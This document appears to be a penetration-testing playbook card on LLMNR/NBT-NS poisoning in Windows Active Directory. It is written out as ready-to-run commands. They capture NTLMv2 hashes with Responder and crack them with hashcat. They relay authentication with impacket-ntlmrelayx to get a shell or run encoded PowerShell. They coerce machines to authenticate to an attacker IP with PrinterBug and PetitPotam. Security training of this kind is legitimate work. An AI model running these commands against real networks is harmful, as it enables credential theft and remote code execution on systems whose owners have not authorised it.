---
id: responder
title: Responder / LLMNR Poisoning
stage: initial-access
tags: [windows, ad, smb]
tools:
  - nxc smb 192.168.x.0/24 --gen-relay-list targets.txt
  - sudo responder -I tun0 -dwv
  - hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt
leads_to:
  - ntlm-relay
  - password-spray
---

## Decision: Relay or Capture?

```bash
# Check if any hosts have SMB signing disabled (relay targets)
nxc smb 192.168.x.0/24 --gen-relay-list targets.txt

# targets.txt non-empty  → RELAY (get shell or dump hashes directly)
# targets.txt empty       → CAPTURE (collect NTLMv2, crack offline)
```

## Capture Mode (all hosts sign)

```bash
# Leave Responder.conf defaults: SMB = On, HTTP = On
sudo responder -I tun0 -dwv

# Crack captured NTLMv2
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt

# Then spray cracked password → password-spray
```

## Relay Mode (unsigned targets)

```bash
# Step 1: Responder.conf → SMB = Off, HTTP = Off
sudo responder -I tun0 -dwv

# Step 2: ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -tf targets.txt -smb2support -i    # interactive SMB shell
impacket-ntlmrelayx -tf targets.txt -smb2support -c "powershell -enc <base64>"
```

## Coercion Attacks (force a machine to authenticate)

```bash
# PrinterBug (requires valid creds, target needs Print Spooler)
python3 printerbug.py $DOMAIN/user:password@$TARGET $ATTACKER_IP

# PetitPotam (sometimes works unauthenticated)
python3 PetitPotam.py $ATTACKER_IP $TARGET
python3 PetitPotam.py -u user -p password $ATTACKER_IP $TARGET
```

## Notes

Start Responder immediately when you join a network — it's passive until something triggers auth. Even on exam boxes, misconfigured internal services often trigger LLMNR lookups.
